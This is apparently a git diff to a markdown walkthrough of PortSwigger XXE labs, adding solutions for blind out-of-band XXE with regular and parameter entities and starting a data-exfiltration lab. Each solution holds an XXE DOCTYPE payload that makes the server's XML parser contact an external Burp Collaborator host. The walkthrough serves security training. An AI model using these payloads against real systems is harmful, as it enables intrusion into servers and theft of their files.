@@ -62,3 +62,41 @@ To solve the lab, use an external entity to make the XML parser issue a DNS look
 
 ![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/77c4c68d-69c0-4628-88f8-37d08cb2278c)
 
+* Give the below payload between the XML declaration and `stockcheck` element and your own Burp Collaborator payload.
+
+      <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://8enq6m2m8qzud1x82itu68s9a0gr4hs6.oastify.com"> ]>
+
+* Replace the `productID` with `&xxe;`
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/717b869f-17ec-4577-9cf1-d32b92ebb7b3)
+
+* Forward the request, we will get that lab is solved.
+
+## Lab 4: Blind XXE with out-of-band interaction via XML parameter entities
+
+This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
+
+To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+
+### Sol :
+
+* Click `check stock` button and intercept the request.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/77c4c68d-69c0-4628-88f8-37d08cb2278c)
+
+* Give the below payload between the XML declaration and `stockcheck` element and your own Burp Collaborator payload.
+
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://yuw9ydysol5e9y6vowhoq7umpdv4jv7k.oastify.com"> %xxe; ]>
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/16265929-1738-412d-808f-30dc54ea3f41)
+
+* Forward the request, we will get that lab is solved.
+
+## Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+
+To solve the lab, exfiltrate the contents of the /etc/hostname file.
+
+### Sol :
+
